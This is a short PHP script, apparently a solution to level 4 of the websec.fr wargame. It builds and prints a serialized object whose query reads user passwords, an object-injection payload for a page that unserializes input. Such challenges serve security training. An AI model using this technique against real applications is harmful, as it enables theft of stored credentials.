<?php
class SQL{
    public $query='select password as username from users';
}
$a=new SQL;
$s=serialize($a);
echo $s;
?>

//Level 4 of websec.fr
